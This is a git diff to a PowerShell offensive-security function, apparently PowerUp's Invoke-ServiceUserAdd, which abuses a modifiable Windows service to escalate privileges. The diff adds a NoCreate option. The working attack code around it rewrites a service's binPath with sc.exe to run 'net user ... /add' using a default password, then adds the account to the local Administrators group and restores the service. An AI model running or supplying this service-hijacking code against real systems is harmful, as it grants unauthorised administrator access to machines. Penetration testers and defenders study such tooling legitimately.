@@ -158,6 +158,9 @@ function Invoke-ServiceUserAdd {
 
     .PARAMETER GroupName
     Group to add the user to (default of Administrators)
+
+    .PARAMETER NoCreate
+    Don't create the user, just add them to the specific group.
         
     .OUTPUTS
     System.bool. The user/password created if successful, false otherwise.
@@ -178,7 +181,8 @@ function Invoke-ServiceUserAdd {
         [Parameter(Mandatory = $True)] [string]$ServiceName,
         [string]$UserName = "john",
         [string]$Password = "Password123!",
-        [string]$GroupName = "Administrators"
+        [string]$GroupName = "Administrators",
+        [Switch]$NoCreate
     )
 
     # query WMI for the service
@@ -207,27 +211,30 @@ function Invoke-ServiceUserAdd {
             Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
             Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"
 
-            Write-Verbose "Adding user '$UserName'"
-            # stop the service
-            $result = sc.exe stop $($TargetService.Name)
-            if ($result -contains "Access is denied."){
-                Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                return $false
-            }
+            # if we're creating the specific user
+            if(-not $NoCreate) {
+                Write-Verbose "Adding user '$UserName'"
+                # stop the service
+                $result = sc.exe stop $($TargetService.Name)
+                if ($result -contains "Access is denied."){
+                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                    return $false
+                }
 
-            # modify the service path to add a user
-            $UserAddCommand = "net user $UserName $Password /add"
-            # change the path name to the user add command- if sc config doesn't error out here,
-            # it shouldn't later on
-            $result = sc.exe config $($TargetService.Name) binPath= $UserAddCommand
-            if ($result -contains "Access is denied."){
-                Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                return $false
-            }
+                # modify the service path to add a user
+                $UserAddCommand = "net user $UserName $Password /add"
+                # change the path name to the user add command- if sc config doesn't error out here,
+                # it shouldn't later on
+                $result = sc.exe config $($TargetService.Name) binPath= $UserAddCommand
+                if ($result -contains "Access is denied."){
+                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                    return $false
+                }
 
-            # start the service and breath
-            $result = sc.exe start $($TargetService.Name)
-            Start-Sleep -s 1
+                # start the service and breath
+                $result = sc.exe start $($TargetService.Name)
+                Start-Sleep -s 1
+            }
 
             Write-Verbose "Adding user '$UserName' to group '$GroupName'"
             # stop the service
@@ -269,7 +276,12 @@ function Invoke-ServiceUserAdd {
                 $result = sc.exe start $($TargetService.Name)
             }
 
-            "[+] User '$UserName' created with password '$Password' and added to localgroup '$GroupName'"
+            if(-not $NoCreate) {
+                "[+] User '$UserName' created with password '$Password' and added to localgroup '$GroupName'"
+            }
+            else{
+                "[+] User '$UserName' added to localgroup '$GroupName'"
+            }
         }
         catch{
             Write-Warning "Error while modifying service '$ServiceName': $_"
